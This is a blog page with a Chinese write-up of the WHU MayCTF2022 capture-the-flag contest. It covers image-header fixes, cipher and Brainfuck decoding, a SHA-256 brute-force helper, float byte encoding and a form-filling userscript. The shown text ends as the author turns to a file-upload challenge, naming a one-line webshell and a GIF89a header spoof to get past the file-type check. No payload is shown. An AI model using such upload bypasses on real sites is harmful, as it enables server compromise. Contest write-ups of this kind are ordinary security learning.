<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="aldlss"><meta name="copyright" content="aldlss"><meta name="generator" content="Hexo 7.3.0"><meta name="theme" content="hexo-theme-yun"><title>WHU MayCTF2022 WP | 风文觉天</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
  [".post-card",".markdown-body img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><script src="https://fastly.jsdelivr.net/npm/pjax@latest/pjax.min.js" defer></script><script src="/js/pjax.js" defer type="module"></script><script src="https://fastly.jsdelivr.net/npm/vue@2.6.14"></script><link rel="icon" type="image/png" href="/favicon.ico"><link rel="mask-icon" href="/favicon.ico" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
    window.Yun = {}
    window.CONFIG = {"hostname":"blog.suwako.cn","root":"/","title":"信仰是为了虚幻之人","version":"1.10.11","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"/data/sentences.json"},"algolia":{"appID":"369JG8XO7A","apiKey":"2092ffcf9f08941419048a10d4abd5f5","indexName":"blog","hits":{"per_page":10}},"fireworks":{"colors":null},"waline":{"config":{"enable":true,"serverURL":"https://comment.blog.suwako.cn","comment":false,"el":"#waline","lang":"zh-CN"},"cdn":"https://fastly.jsdelivr.net/npm/@waline/client@v2/dist/waline.js","dark":"html.dark"},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><link rel="preconnect" href="https://www.google-analytics.com" crossorigin><script async src="https://www.googletagmanager.com/gtag/js?id=G-JLJZK2MK9C"></script><script>if (CONFIG.hostname === location.hostname) {
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  gtag('config', 'G-JLJZK2MK9C');
}</script><script>//- only for pjax
function sendPageView() {
  if (CONFIG.hostname !== location.hostname) return;
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('event', 'page_view', {
    page_path: encodeURIComponent(location.pathname),
  })
}
document.addEventListener("pjax:success", sendPageView);</script><meta name="description" content="填个坑">
<meta property="og:type" content="article">
<meta property="og:title" content="WHU MayCTF2022 WP">
<meta property="og:url" content="https://blog.suwako.cn/MayCTF2022-WP/index.html">
<meta property="og:site_name" content="风文觉天">
<meta property="og:description" content="填个坑">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.suwako.cn/aldlss-blog/pic/picmayctf2022_yukari_shojo1.png">
<meta property="og:image" content="https://cdn.suwako.cn/aldlss-blog/pic/picmayctf2022_yukari_hint.jpg">
<meta property="og:image" content="https://cdn.suwako.cn/aldlss-blog/pic/picmayctf2022_yukari_shojo2.png">
<meta property="og:image" content="https://cdn.suwako.cn/aldlss-blog/pic/picmayctf2022_sheep_sheep2.png">
<meta property="og:image" content="https://cdn.suwako.cn/aldlss-blog/pic/picmayctf2022_sheep_sheep0.png">
<meta property="og:image" content="https://cdn.suwako.cn/aldlss-blog/pic/picmayctf2022_sheep_sheep1.png">
<meta property="og:image" content="https://cdn.suwako.cn/aldlss-blog/pic/picmayctf2022_Seija_seija1.png">
<meta property="og:image" content="https://cdn.suwako.cn/aldlss-blog/pic/picmayctf2022_cfg_cfg0.png">
<meta property="og:image" content="https://cdn.suwako.cn/aldlss-blog/pic/picmayctf2022_shape_scr_0.png">
<meta property="og:image" content="https://cdn.suwako.cn/aldlss-blog/pic/picmayctf2022_shape_scr_1.png">
<meta property="og:image" content="https://cdn.suwako.cn/aldlss-blog/pic/picmayctf2022_maze_0.png">
<meta property="og:image" content="https://cdn.suwako.cn/aldlss-blog/pic/picmayctf2022_mix_0.png">
<meta property="og:image" content="https://cdn.suwako.cn/aldlss-blog/pic/picmayctf2022_flan_0.png">
<meta property="og:image" content="https://cdn.suwako.cn/aldlss-blog/pic/picmayctf2022_flan_1.png">
<meta property="og:image" content="https://cdn.suwako.cn/aldlss-blog/pic/picmayctf2022_flan_ffflan.png">
<meta property="og:image" content="https://cdn.suwako.cn/aldlss-blog/pic/picmayctf2022_flan_2.png">
<meta property="og:image" content="https://cdn.suwako.cn/aldlss-blog/pic/picmayctf2022_flan_ffflan.gif">
<meta property="og:image" content="https://cdn.suwako.cn/aldlss-blog/pic/picmayctf2022_flan_3.png">
<meta property="og:image" content="https://cdn.suwako.cn/aldlss-blog/pic/picmayctf2022_flan_ffflan.jpg">
<meta property="article:published_time" content="2023-02-22T15:23:22.000Z">
<meta property="article:modified_time" content="2023-02-27T02:15:20.000Z">
<meta property="article:author" content="aldlss">
<meta property="article:tag" content="比赛">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.suwako.cn/aldlss-blog/pic/picmayctf2022_yukari_shojo1.png"><script>(function() {
  if (CONFIG.mode !== 'auto') return
  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
  const setting = localStorage.getItem('darken-mode') || 'auto'
  if (setting === 'dark' || (prefersDark && setting !== 'light'))
    document.documentElement.classList.toggle('dark', true)
})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
IconifyProviders = {
  // Empty prefix: overwrite default API provider configuration
  '': {
    // Use custom API first, use Iconify public API as backup
    resources: [
        'https://api.iconify.design',
    ],
    // Wait for 1 second before switching API hosts
    rotate: 1000,
  },
};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="aldlss"><img width="96" loading="lazy" src="https://cdn.suwako.cn/aldlss-blog/avatar.jpg" alt="aldlss"><span class="site-author-status" title="那咋办">🤔</span></a><div class="site-author-name"><a href="/about/">aldlss</a></div><a class="site-name" href="/about/site">风文觉天</a><sub class="site-subtitle">信仰是为了虚幻之人</sub><div class="site-description">在学了在学了</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">15</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">3</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">11</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://resume.aldlss.work" title="resume"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:article-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/aldlss" title="GitHub" target="_blank" style="color:#181717"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:aya@suwako.cn" title="E-Mail" target="_blank" style="color:#8E71C1"><span class="icon iconify" data-icon="ri:mail-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://space.bilibili.com/5915138" title="bilibili" target="_blank" style="color:#FA85A3"><span class="icon iconify" data-icon="ri:bilibili-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="朋友们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%97%A5"><span class="toc-number">1.</span> <span class="toc-text">第一日</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E7%B4%AB"><span class="toc-number">1.1.</span> <span class="toc-text">小紫</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NO-COPY"><span class="toc-number">1.2.</span> <span class="toc-text">NO COPY</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rack-your-brain"><span class="toc-number">1.3.</span> <span class="toc-text">rack your brain</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sign-in"><span class="toc-number">1.4.</span> <span class="toc-text">sign_in</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%97%A5"><span class="toc-number">2.</span> <span class="toc-text">第二日</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#baby-typing-game"><span class="toc-number">2.1.</span> <span class="toc-text">baby_typing_game</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#get-my-number"><span class="toc-number">2.2.</span> <span class="toc-text">get_my_number</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#get-my-float"><span class="toc-number">2.3.</span> <span class="toc-text">get_my_float</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cuora-and-her-shell"><span class="toc-number">2.4.</span> <span class="toc-text">cuora_and_her_shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#thing-dog"><span class="toc-number">2.5.</span> <span class="toc-text">thing dog</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#typing-train"><span class="toc-number">2.6.</span> <span class="toc-text">typing train</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#background"><span class="toc-number">2.7.</span> <span class="toc-text">background</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-md5"><span class="toc-number">2.8.</span> <span class="toc-text">easy_md5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sheep"><span class="toc-number">2.9.</span> <span class="toc-text">sheep</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BE%E6%8A%A5%E5%B0%8F%E9%BB%91%E5%AD%90-%E9%AC%BC%E4%BA%BA%E6%AD%A3%E9%82%AA%E7%9A%84%E6%8C%91%E6%88%98"><span class="toc-number">2.10.</span> <span class="toc-text">举报小黑子&amp;鬼人正邪的挑战</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hello-net"><span class="toc-number">2.11.</span> <span class="toc-text">hello_net</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#secsome-cfg"><span class="toc-number">2.12.</span> <span class="toc-text">secsome_cfg</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%80%E7%BB%88%E6%97%A5"><span class="toc-number">3.</span> <span class="toc-text">最终日</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#typing-game-revange-AKA-baby-guess-me"><span class="toc-number">3.1.</span> <span class="toc-text">typing_game_revange AKA baby_guess_me</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#find-it"><span class="toc-number">3.2.</span> <span class="toc-text">find_it</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shape-secret"><span class="toc-number">3.3.</span> <span class="toc-text">shape_secret</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#maze"><span class="toc-number">3.4.</span> <span class="toc-text">maze</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mixture"><span class="toc-number">3.5.</span> <span class="toc-text">mixture</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EX"><span class="toc-number">4.</span> <span class="toc-text">EX</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A6%81%E5%BF%8C-%E5%9B%9B%E9%87%8D%E5%AD%98%E5%9C%A8"><span class="toc-number">4.1.</span> <span class="toc-text">禁忌 四重存在</span></a></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="https://blog.suwako.cn/MayCTF2022-WP/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="aldlss"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="风文觉天"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">WHU MayCTF2022 WP<a class="post-edit-link" href="https://github.com/Ayaloia/aldlss.github.io/tree/master/source/_posts/MayCTF2022-WP.md" target="_blank" title="编辑" rel="noopener"><span class="icon iconify" data-icon="ri:edit-line"></span></a></h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2023-02-22 23:23:22" itemprop="dateCreated datePublished" datetime="2023-02-22T23:23:22+08:00">2023-02-22</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <time title="修改时间：2023-02-27 10:15:20" itemprop="dateModified" datetime="2023-02-27T10:15:20+08:00">2023-02-27</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="本文字数"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="本文字数">6.7k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读时长"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="阅读时长">26m</span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/%E5%BF%83%E5%BE%97/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">心得</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/%E6%AF%94%E8%B5%9B/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">比赛</span></a></span></div><div class="post-author"><span class="author-name">填坑的 aldlss</span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><p>这篇 WP 写成于 2022 年 11 月 7 日，当时就准备把它放博客上来的，无奈当时还没有建好博客，因此只好暂时搁置。现在属于是把坑填上了。</p>
<span id="more"></span>

<p>在开始之前，一些背景简介（具体意思可上网搜索）：</p>
<ul>
<li><p>CTF: 信息安全竞赛，要说的话感觉就是信息安全领域的算法竞赛这样子。</p>
</li>
<li><p>WP: 大概是题目的题解。</p>
</li>
<li><p>MayCTF: 武汉大学网安学院 CTF 团队举办的 CTF 比赛，本次我参加的是 2022 年的。</p>
</li>
</ul>
<p>大概就这样，下面是原来的文章：</p>
<hr>
<p>MayCTF，本来是在别的地方看到了。当时开始的时候因为比较忙和懒，大概是没有准备参加的。后来 1 号晚上的时候看群里在聊题目，看到有小紫这题，因为对题目背景还是挺感兴趣的，于是就马上做看看了</p>
<h2 id="第一日"><a href="#第一日" class="headerlink" title="第一日"></a>第一日</h2><h3 id="小紫"><a href="#小紫" class="headerlink" title="小紫"></a>小紫</h3><p>期间错误的尝试就不多说了，我还一度怀疑过 shojo 是什么意思，最后查了查发现原来是少女的意思&#x3D; &#x3D;<br>后面看到“八云紫老”这一串字感觉是不属于原来这个图的，然后而且还有没话没说完的感觉，又看到网上说 ctf 图片有个经典题型就是改长度宽度，于是就参考了一下 png 文件头，<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46352852/article/details/124707547">PNG文件格式解析</a>（这个还有例子，喜欢），并照着改了一下，果然是现形了，于是解压，看见 bmp，以及 hint:<br><img src="https://cdn.suwako.cn/aldlss-blog/pic/picmayctf2022_yukari_shojo1.png" width=200 loading="lazy"><img src="https://cdn.suwako.cn/aldlss-blog/pic/picmayctf2022_yukari_hint.jpg" width=300 loading="lazy"></p>
<p>这个 hint 也是比较乐的梗图了，应该主要是想提示还有一个字没出来吧。所以判断应该差不多也是要改高度，于是也搜了搜 bmp 图片的文件头<a target="_blank" rel="noopener" href="https://www.cnblogs.com/robin-oneway/p/13932982.html">常见图片格式分析-bmp，png</a>（这个也有例子，喜欢）。不过 bmp 似乎不像 png 一样，改大了无所谓，只是会下面一片空，这个好像改大了直接就打不开了，于是就最后一点一点地加，也算是成功了：<br><img src="https://cdn.suwako.cn/aldlss-blog/pic/picmayctf2022_yukari_shojo2.png" width=400 loading="lazy"></p>
<p>可以看到，在右上角，很小一撮，还以为会是也在下面来着。flag 也在上面，出题人最后也是不忘把“婆”字补上，祝你被脸滚键盘（<br>PS：刚刚写 wp 的时候发现，似乎长度或宽度有缩减的 png 在 vscode 上不能直接预览（？或许也不失为一种快捷判断方法</p>
<h3 id="NO-COPY"><a href="#NO-COPY" class="headerlink" title="NO COPY"></a>NO COPY</h3><p>记得大概要复制一个网页的内容才能解题，但是不给复制，这个还是很简单的，我做的时候已经是 100 分题了，就是直接 F12 审查元素然后复制 html 元素，然后自己建一个 html 打开就可以复制了</p>
<h3 id="rack-your-brain"><a href="#rack-your-brain" class="headerlink" title="rack your brain"></a>rack your brain</h3><p>这个其实也比较简单，一开始是佛又曰开头，一眼那个佛祖加密，不过版本还挺多，找到这个版本的还不太容易<a target="_blank" rel="noopener" href="http://www.atoolbox.net/Tool.php?Id=1027">与佛论禅加密&#x2F;解密</a>。解密之后是一串</p>
<figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">++++++++</span><span class="title">[</span>&gt;&gt;<span class="literal">++</span>&gt;<span class="literal">++++</span>&gt;<span class="literal">++++++</span>&gt;<span class="literal">++++++++</span>&gt;<span class="literal">++++++++++</span>&gt;<span class="literal">++++++++++++</span>&gt;<span class="literal">++++++++++++++</span>&gt;<span class="literal">++++++++++++++++</span>&gt;<span class="literal">++++++++++++++++++</span>&gt;<span class="literal">++++++++++++++++++++</span>&gt;<span class="literal">++++++++++++++++++++++</span>&gt;<span class="literal">++++++++++++++++++++++++</span>&gt;<span class="literal">++++++++++++++++++++++++++</span>&gt;<span class="literal">++++++++++++++++++++++++++++</span>&gt;<span class="literal">++++++++++++++++++++++++++++++</span>&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;<span class="literal">-</span><span class="title">]</span>&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;<span class="literal">---</span><span class="string">.</span>&lt;<span class="literal">+</span><span class="string">.</span>&gt;&gt;<span class="literal">-------</span><span class="string">.</span>&lt;&lt;<span class="literal">++</span><span class="string">.</span>&gt;&gt;<span class="literal">-----</span><span class="string">.</span>&lt;&lt;<span class="literal">+++</span><span class="string">.</span>&gt;&gt;<span class="literal">+++++++</span><span class="string">.</span><span class="literal">----</span><span class="string">.</span>&lt;&lt;<span class="literal">++</span><span class="string">.</span><span class="literal">-------</span><span class="string">.</span>&gt;&gt;<span class="literal">---</span><span class="string">.</span>&lt;&lt;<span class="literal">--</span><span class="string">.</span><span class="literal">++</span><span class="string">.</span><span class="literal">--</span><span class="string">.</span>&lt;&lt;&lt;<span class="literal">++++++</span><span class="string">.</span>&gt;&gt;&gt;&gt;&gt;<span class="literal">--</span><span class="string">.</span>&lt;&lt;<span class="literal">++</span><span class="string">.</span>&gt;<span class="literal">----</span><span class="string">.</span>&gt;<span class="literal">----</span><span class="string">.</span>&lt;<span class="literal">---</span><span class="string">.</span>&lt;&lt;&lt;&lt;&lt;<span class="literal">++++++++++</span><span class="string">.</span><span class="string">.</span>&gt;&gt;&gt;&gt;&gt;&gt;<span class="literal">---</span><span class="string">.</span>&lt;<span class="literal">-</span><span class="string">.</span>&gt;<span class="literal">+++++++</span><span class="string">.</span>&lt;&lt;&lt;&lt;&lt;<span class="string">.</span><span class="string">.</span><span class="string">.</span>&gt;&gt;&gt;&gt;&gt;<span class="literal">+++++++++++</span><span class="string">.</span></span><br></pre></td></tr></table></figure>
<p>因为之前听说过，所以大概猜想是 <code>brainfuck</code> 语言了，不过要找个编译器还是不简单，不过最后通过bing还是找到了<a target="_blank" rel="noopener" href="https://www.w3cschool.cn/tryrun/runcode?lang=brainfuck">brainfuck 在线工具</a>，然后就出结果了 <code>mayctf&#123;what_a_6rainf**ker666&#125;</code>(用语还是要文明)</p>
<hr>
<p>嗯，2号凌晨就写了这三道，写完还看了看别的，但是有点不太会写，看时间也很晚了，于是就睡觉了。不过题目写下来倒是觉得挺有趣的，因此也是想继续写下去的。<del>接下来写题顺序也记不清了，现在也看不到了，于是就想到哪个写哪个吧（</del> 反转了，原来居然有备份，那接下来就按解题顺序写了</p>
<h3 id="sign-in"><a href="#sign-in" class="headerlink" title="sign_in"></a>sign_in</h3><p>整个白天和晚上都没什么进展，甚至琢磨怎么进频道琢磨了好久，因为不想升级手机 qq，一开始想用安卓模拟器装，结果 qq 闪退；然后寻思用 WSA 装，结果也闪退；最后寻思手机的手机分身应该可以——确实可以，然后我原来的 qq 也被升级了。大号还进不了频道，最后只能用小号进了频道，得到了 flag 。某种程度上说，这个题目的难度不亚于其他题目（？</p>
<h2 id="第二日"><a href="#第二日" class="headerlink" title="第二日"></a>第二日</h2><h3 id="baby-typing-game"><a href="#baby-typing-game" class="headerlink" title="baby_typing_game"></a>baby_typing_game</h3><p>之前做了些别的 nc 题目都不太行，这个题目其实更像是给了我一点启发，让我领悟到了其实完全用 python 解决这种题目才是正道，毕竟总不可能真的抄 999 遍（<br>基本上就是照抄就行了，感觉甚至考的字符串的运用和网络连接的使用，不过python还是比较容易写的。开头的 sha256 验证一开始有点唬到我了，不过一想才 4 个未知的，直接暴力应该也是可以的。<br>因为源码被我拿去魔改写另一题了（下面会提到），于是暂不可考，这里就只贴出 sha256 验证的部分的吧，毕竟还是有不少题用到这个的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sha</span>(<span class="params">origin:<span class="built_in">str</span>,ans:<span class="built_in">str</span></span>)-&gt;<span class="built_in">str</span>:</span><br><span class="line">    aaa=<span class="string">&quot;0123456789QWERTYUIOPLKJHGFDSAZXCVBNMqwertyuioplkjhgfdsazxcvbnm&quot;</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> aaa:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> aaa:</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> aaa:</span><br><span class="line">                <span class="keyword">for</span> d <span class="keyword">in</span> aaa:</span><br><span class="line">                    test=a+b+c+d+origin</span><br><span class="line">                    <span class="keyword">if</span> hashlib.sha256(test.encode(<span class="string">&quot;utf-8&quot;</span>)).hexdigest()==ans:</span><br><span class="line">                        <span class="keyword">return</span> a+b+c+d</span><br></pre></td></tr></table></figure>
<p>这道题其实凌晨跑出来的，但是当时网站暂停了，提交不了 flag，所以就早上起来交了</p>
<h3 id="get-my-number"><a href="#get-my-number" class="headerlink" title="get_my_number"></a>get_my_number</h3><p>早上上数据结构课也无聊，于是直接开启远程桌面写了点题- -。由于远程桌面是有点不方便操控的，于是就把题目都大概看了一下，看看有没有那种操作比较少的或者只有单个文件的那种，于是就看到 pwn 的这些题目了。<br>这个题目其实看源码我也是有点没搞明白具体原理是什么，只知道大概是比较什么。不过鉴于通过人数那么多，我觉得是不是只要随便输入一串巨大的数字就可以了？<br>还真是</p>
<h3 id="get-my-float"><a href="#get-my-float" class="headerlink" title="get_my_float"></a>get_my_float</h3><p>于是继续看 pwn 第二题，源码也写得很清楚了数值为 0.618 的时候通过，然后让我们写入字节，主要考察的是浮点数的底层表示吧。<br>这里找到个网站<a target="_blank" rel="noopener" href="http://www.binaryconvert.com/convert_double.html">Double (IEEE754 Double precision 64-bit) Converter</a>，然后通过能输入 16 进制的网络工具输入就好了。不过值得注意的是，一般用的都是小端法，所以这串字节 <code>0x3FE3C6A7EF9DB22D</code> 得反着输入。</p>
<h3 id="cuora-and-her-shell"><a href="#cuora-and-her-shell" class="headerlink" title="cuora_and_her_shell"></a>cuora_and_her_shell</h3><p>这道题最后也是没写出来，似乎是要写 shellcode 之类的，源码还很贴心地直接把写入的代码运行了。然而直到最后也是没有找到写进去成功的，大概还是有些问题没考虑清楚，令人感叹。或许我该用上一题的网络工具发送的而不是用 Python，忘记了，沉迷 Python 了（</p>
<h3 id="thing-dog"><a href="#thing-dog" class="headerlink" title="thing dog"></a>thing dog</h3><p>这时候已经上完课回来了，所以开始写这些比较要工具的了。这题是音频文件，看到群里唠嗑说分离左右音频，我马上打开我的 Au 进行分离，确实有个声道是一段不明所以的英文。我还真没整明白，上网搜还以为要看频谱图之类的，结果发现都没有，最后看群里才发现是那个北约呼号。结果感觉还是有些对不上，最后又看了下群里的记录，发现有人居然用的谷歌识别，学到许多，但还是不对。<br>最后突然悟了，它把左右括号和下划线的英文也读出来了，怪不得有些不在表内的英文，比如 <code>underline</code> 之类的。原来这样也行，怎么你们都会啊 QAQ </p>
<h3 id="typing-train"><a href="#typing-train" class="headerlink" title="typing train"></a>typing train</h3><p>这题昨晚就一直在写了，不过不是我在写，是 js 帮我在写。我觉得大概是真的要 6666 次才行，但想到那么多人过题又觉得是不是不对劲，最后还是写了一个油猴脚本狂暴帮我 typing，后面还加了对于字符长度的判断。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ==UserScript==</span></span><br><span class="line"><span class="comment">// @match        http://124.***.**.***:20002/*  (这里要修改成这样，使用通配符) PS: 这里用星号隐去了原 IP</span></span><br><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="string">&#x27;use strict&#x27;</span>;</span><br><span class="line">    <span class="keyword">let</span> a=<span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&quot;typing&quot;</span>)[<span class="number">0</span>].<span class="property">textContent</span>;</span><br><span class="line">    <span class="keyword">if</span>(a.<span class="property">length</span>==<span class="number">32</span>)&#123;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&quot;input&quot;</span>)[<span class="number">0</span>].<span class="property">value</span>=a;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;form&quot;</span>)[<span class="number">0</span>].<span class="title function_">submit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
<p>写完上一题之后没多久去那个页面看了看，发现出错了，然后旁边 flag 也出来了，虽然有点不明所以，不过大概是解出来了。</p>
<h3 id="background"><a href="#background" class="headerlink" title="background"></a>background</h3><p>看到来新题了，于是马上去看了看。好家伙，上传东西，得益于写 sheep 的时候搜索的大量资料，猜测大概使用一句话木马或者其变体来使用 webshell。<br>最简单的一句话木马果然不行，后来看到有个 gif89a 图片文件头欺骗的方法<a target="_blank" rel="noopener" href="https://blog.csdn.net/piaolankeke/article/details/5872876">GIF89a图片头文件欺骗</a>，就试了一下:</p>
